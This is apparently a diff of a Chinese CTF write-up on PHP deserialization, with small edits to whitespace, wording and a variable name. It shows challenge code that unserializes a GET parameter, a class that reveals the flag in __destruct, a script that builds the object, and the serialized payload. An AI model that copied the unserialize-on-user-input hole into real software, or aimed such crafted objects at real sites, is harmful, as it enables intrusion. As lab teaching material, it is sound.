@@ -2,7 +2,7 @@
     include &#39;class.php&#39;;
     $select = $_GET[&#39;select&#39;];
     $res=unserialize(@$select);
-    ?&gt;
+?&gt;
 </code></pre><p>包含<code>class.php</code>，以GET的方式传了一个名为<code>select</code>的参数，然后将结果反序列化</p><p><code>class.php</code>是一段代码审计</p><pre><code class="php">&lt;?php
 include &#39;flag.php&#39;;
 
@@ -41,13 +41,12 @@ class Name&#123;
         &#125;else&#123;
             echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;
             die();
-
-            
+   
         &#125;
     &#125;
 &#125;
 ?&gt;
-</code></pre><p>意思大概是username要等于<code>admin</code>同时password要等于<code>100</code>，执行<code>__destruct</code>的时候输出flag</p><br><p>构造反序列化</p><pre><code class="php">&lt;?php
+</code></pre><p>意思大概是username要等于<code>admin</code>的同时password要等于<code>100</code>，执行<code>__destruct</code>的时候输出flag</p><br><p>构造反序列化</p><pre><code class="php">&lt;?php
 
 class Name&#123;
     private $username = &#39;nonono&#39;;
@@ -59,8 +58,8 @@ class Name&#123;
     &#125;
 &#125;
 
-    $a = new Name(&#39;admin&#39;,100);
-    var_dump(serialize($a));
+    $flag = new Name(&#39;admin&#39;,100);
+    var_dump(serialize($flag));
 
 ?&gt;
 </code></pre><p>得到序列化后的结果</p><pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;
